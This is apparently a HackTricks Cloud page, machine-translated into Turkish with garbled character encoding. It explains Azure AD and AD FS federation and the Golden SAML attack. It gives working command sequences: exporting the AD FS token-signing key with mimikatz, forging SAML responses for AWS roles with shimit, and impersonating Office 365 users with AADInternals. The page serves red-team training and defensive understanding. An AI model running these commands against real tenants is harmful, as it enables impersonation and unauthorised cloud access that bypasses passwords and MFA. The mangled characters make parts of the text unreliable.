# Az - Federation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federation**, **gÃ¼ven** kurmuÅŸ **alanlar** topluluÄŸudur. GÃ¼ven seviyesi deÄŸiÅŸiklik gÃ¶sterebilir, ancak genellikle **kimlik doÄŸrulama** iÃ§erir ve neredeyse her zaman **yetkilendirme** iÃ§erir. Tipik bir federasyon, **paylaÅŸÄ±lan eriÅŸim** iÃ§in **gÃ¼ven** kurmuÅŸ **bir dizi organizasyon** iÃ§erebilir.

**On-premises** ortamÄ±nÄ±zÄ± **Azure AD** ile **federate** edebilir ve bu federasyonu kimlik doÄŸrulama ve yetkilendirme iÃ§in kullanabilirsiniz. Bu oturum aÃ§ma yÃ¶ntemi, tÃ¼m kullanÄ±cÄ± **kimlik doÄŸrulamasÄ±nÄ±n on-premises** ortamÄ±nda gerÃ§ekleÅŸmesini saÄŸlar. Bu yÃ¶ntem, yÃ¶neticilerin daha katÄ± eriÅŸim kontrol seviyeleri uygulamasÄ±na olanak tanÄ±r. **AD FS** ve PingFederate ile federasyon mevcuttur.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

Temelde, Federasyonda, tÃ¼m **kimlik doÄŸrulama** **on-prem** ortamÄ±nda gerÃ§ekleÅŸir ve kullanÄ±cÄ±, tÃ¼m gÃ¼venilir ortamlar arasÄ±nda SSO deneyimler. Bu nedenle, kullanÄ±cÄ±lar **on-prem kimlik bilgilerini** kullanarak **bulut** uygulamalarÄ±na **eriÅŸim** saÄŸlayabilirler.

**Security Assertion Markup Language (SAML)**, saÄŸlayÄ±cÄ±lar arasÄ±nda tÃ¼m kimlik doÄŸrulama ve yetkilendirme **bilgilerini** **deÄŸiÅŸtirmek** iÃ§in kullanÄ±lÄ±r.

Herhangi bir federasyon kurulumunda Ã¼Ã§ taraf vardÄ±r:

* KullanÄ±cÄ± veya Ä°stemci
* Kimlik SaÄŸlayÄ±cÄ± (IdP)
* Hizmet SaÄŸlayÄ±cÄ± (SP)

(Images from https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. Ä°lk olarak, bir kullanÄ±cÄ± bir uygulamaya (Hizmet SaÄŸlayÄ±cÄ± veya SP, Ã¶rneÄŸin AWS konsolu veya vSphere web istemcisi) eriÅŸir. Bu adÄ±m atlanabilir ve istemci doÄŸrudan IdP'ye (Kimlik SaÄŸlayÄ±cÄ±) yÃ¶nlendirilebilir.
2. Daha sonra, SP, kullanÄ±cÄ± kimlik doÄŸrulamasÄ± iÃ§in uygun IdP'yi (Ã¶rneÄŸin, AD FS, Okta) belirler. ArdÄ±ndan, bir SAML (Security Assertion Markup Language) AuthnRequest oluÅŸturur ve istemciyi seÃ§ilen IdP'ye yÃ¶nlendirir.
3. IdP devralÄ±r, kullanÄ±cÄ±yÄ± kimlik doÄŸrular. Kimlik doÄŸrulama sonrasÄ±, IdP tarafÄ±ndan bir SAMLResponse oluÅŸturulur ve kullanÄ±cÄ± aracÄ±lÄ±ÄŸÄ±yla SP'ye iletilir.
4. Son olarak, SP SAMLResponse'yi deÄŸerlendirir. BaÅŸarÄ±yla doÄŸrulanÄ±rsa, IdP ile bir gÃ¼ven iliÅŸkisi olduÄŸunu gÃ¶sterir ve kullanÄ±cÄ±ya eriÅŸim verilir. Bu, oturum aÃ§ma sÃ¼recinin tamamlandÄ±ÄŸÄ±nÄ± iÅŸaret eder ve kullanÄ±cÄ±nÄ±n hizmeti kullanmasÄ±na olanak tanÄ±r.

**SAML kimlik doÄŸrulamasÄ± ve yaygÄ±n saldÄ±rÄ±lar hakkÄ±nda daha fazla bilgi edinmek istiyorsanÄ±z:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS, iddia temelli bir kimlik modelidir.
* "..iddialar, kullanÄ±cÄ±lar hakkÄ±nda yapÄ±lan (Ã¶rneÄŸin, ad, kimlik, grup) basit ifadelerdir ve esasen internet Ã¼zerinde herhangi bir yerde bulunan iddia temelli uygulamalara eriÅŸimi yetkilendirmek iÃ§in kullanÄ±lÄ±r."
* Bir kullanÄ±cÄ± iÃ§in iddialar SAML token'larÄ±nÄ±n iÃ§inde yazÄ±lÄ±r ve ardÄ±ndan IdP tarafÄ±ndan gizlilik saÄŸlamak iÃ§in imzalanÄ±r.
* Bir kullanÄ±cÄ± ImmutableID ile tanÄ±mlanÄ±r. Bu, kÃ¼resel olarak benzersizdir ve Azure AD'de saklanÄ±r.
* ImmutableID, kullanÄ±cÄ± iÃ§in on-premises ms-DS-ConsistencyGuid Ã¼zerinde saklanÄ±r ve/veya kullanÄ±cÄ±nÄ±n GUID'inden tÃ¼retilebilir.
* Daha fazla bilgi iÃ§in [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML saldÄ±rÄ±sÄ±:**

* ADFS'de, SAML YanÄ±tÄ± bir token-imzalama sertifikasÄ± ile imzalanÄ±r.
* Sertifika tehlikeye girerse, Azure AD'ye herhangi bir kullanÄ±cÄ± olarak kimlik doÄŸrulamak mÃ¼mkÃ¼ndÃ¼r!
* PTA istismarÄ±mÄ±z gibi, bir kullanÄ±cÄ± iÃ§in ÅŸifre deÄŸiÅŸikliÄŸi veya MFA'nÄ±n hiÃ§bir etkisi olmayacaktÄ±r Ã§Ã¼nkÃ¼ kimlik doÄŸrulama yanÄ±tÄ±nÄ± sahteleyerek iÅŸlem yapÄ±yoruz.
* Sertifika, DA ayrÄ±calÄ±klarÄ± ile AD FS sunucusundan Ã§Ä±karÄ±labilir ve ardÄ±ndan herhangi bir internet baÄŸlantÄ±lÄ± makineden kullanÄ±labilir.
* Daha fazla bilgi iÃ§in [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Bir **Kimlik SaÄŸlayÄ±cÄ± (IdP)** tarafÄ±ndan kullanÄ±cÄ± oturum aÃ§masÄ±nÄ± yetkilendirmek iÃ§in bir **SAMLResponse** Ã¼retilmesi sÃ¼reci Ã§ok Ã¶nemlidir. IdP'nin belirli uygulamasÄ±na baÄŸlÄ± olarak, **yanÄ±t** **imzalanmÄ±ÅŸ** veya **ÅŸifrelenmiÅŸ** olabilir ve bu, **IdP'nin Ã¶zel anahtarÄ±** kullanÄ±larak yapÄ±lÄ±r. Bu prosedÃ¼r, **Hizmet SaÄŸlayÄ±cÄ± (SP)**'nÄ±n SAMLResponse'nin doÄŸruluÄŸunu onaylamasÄ±nÄ± saÄŸlar ve bunun gerÃ§ekten gÃ¼venilir bir IdP tarafÄ±ndan verildiÄŸini garanti eder.

[Golden ticket attack](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket) ile bir paralellik kurulabilir; burada kullanÄ±cÄ±nÄ±n kimliÄŸini ve izinlerini doÄŸrulayan anahtar (golden ticket iÃ§in KRBTGT, golden SAML iÃ§in token-imzalama Ã¶zel anahtarÄ±) sahte bir kimlik doÄŸrulama nesnesi (TGT veya SAMLResponse) oluÅŸturmak iÃ§in manipÃ¼le edilebilir. Bu, herhangi bir kullanÄ±cÄ±nÄ±n taklit edilmesine ve SP'ye yetkisiz eriÅŸim saÄŸlanmasÄ±na olanak tanÄ±r.

Golden SAML'lerin belirli avantajlarÄ± vardÄ±r:

* **Uzakta oluÅŸturulabilirler**, ilgili alan veya federasyonun parÃ§asÄ± olma gereÄŸi olmaksÄ±zÄ±n.
* **Ä°ki FaktÃ¶rlÃ¼ Kimlik DoÄŸrulama (2FA)** etkin olsa bile etkili kalÄ±rlar.
* Token-imzalama **Ã¶zel anahtarÄ± otomatik olarak yenilenmez**.
* **Bir kullanÄ±cÄ±nÄ±n ÅŸifresini deÄŸiÅŸtirmek,** zaten oluÅŸturulmuÅŸ bir SAML'yi geÃ§ersiz kÄ±lmaz.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) Microsoft'un gÃ¼venilir iÅŸ ortaklarÄ± (federasyon) arasÄ±nda **kimlik bilgilerini gÃ¼venli bir ÅŸekilde deÄŸiÅŸtirmeyi** kolaylaÅŸtÄ±ran bir hizmetidir. Temelde, bir alan hizmetinin, bir federasyon iÃ§indeki diÄŸer hizmet saÄŸlayÄ±cÄ±larla kullanÄ±cÄ± kimliklerini paylaÅŸmasÄ±na olanak tanÄ±r.

AWS, tehlikeye giren alanÄ± (bir federasyonda) gÃ¼venilir kabul ettiÄŸinde, bu zafiyet, **AWS ortamÄ±nda herhangi bir izin elde etme** potansiyeli taÅŸÄ±r. SaldÄ±rÄ±, SAML nesnelerini imzalamak iÃ§in kullanÄ±lan **Ã¶zel anahtarÄ±** gerektirir; bu, golden ticket saldÄ±rÄ±sÄ±nda KRBTGT'yi gerektirmeye benzer. AD FS kullanÄ±cÄ± hesabÄ±na eriÅŸim, bu Ã¶zel anahtarÄ± elde etmek iÃ§in yeterlidir.

Golden SAML saldÄ±rÄ±sÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in gerekenler ÅŸunlardÄ±r:

* **Token-imzalama Ã¶zel anahtarÄ±**
* **IdP genel sertifikasÄ±**
* **IdP adÄ±**
* **Rol adÄ± (Ã¼stlenilecek rol)**
* Alan\kullanÄ±cÄ± adÄ±
* AWS'deki rol oturum adÄ±
* Amazon hesap kimliÄŸi

_Sadece kalÄ±n yazÄ±lÄ± olanlar zorunludur. DiÄŸerleri istenildiÄŸi gibi doldurulabilir._

**Ã–zel anahtarÄ±** elde etmek iÃ§in **AD FS kullanÄ±cÄ± hesabÄ±na** eriÅŸim gereklidir. Buradan, Ã¶zel anahtar, [mimikatz](https://github.com/gentilkiwi/mimikatz) gibi araÃ§lar kullanÄ±larak **kiÅŸisel depodan dÄ±ÅŸa aktarÄ±labilir**. DiÄŸer gerekli bilgileri toplamak iÃ§in, Microsoft.Adfs.Powershell snapin'ini ÅŸu ÅŸekilde kullanabilirsiniz; ADFS kullanÄ±cÄ±sÄ± olarak oturum aÃ§tÄ±ÄŸÄ±nÄ±zdan emin olun:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
TÃ¼m bu bilgilerle, taklit etmek istediÄŸiniz kullanÄ±cÄ± olarak geÃ§erli bir SAMLResponse unutmak mÃ¼mkÃ¼ndÃ¼r, [**shimit**](https://github.com/cyberark/shimit)** kullanarak:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### Yerel -> bulut
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
Cloud yalnÄ±zca kullanÄ±cÄ±larÄ±nÄ±n ImmutableID'sini oluÅŸturmak ve onlarÄ± taklit etmek de mÃ¼mkÃ¼ndÃ¼r.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## Referanslar

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± Ekip UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± Ekip UzmanÄ± (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
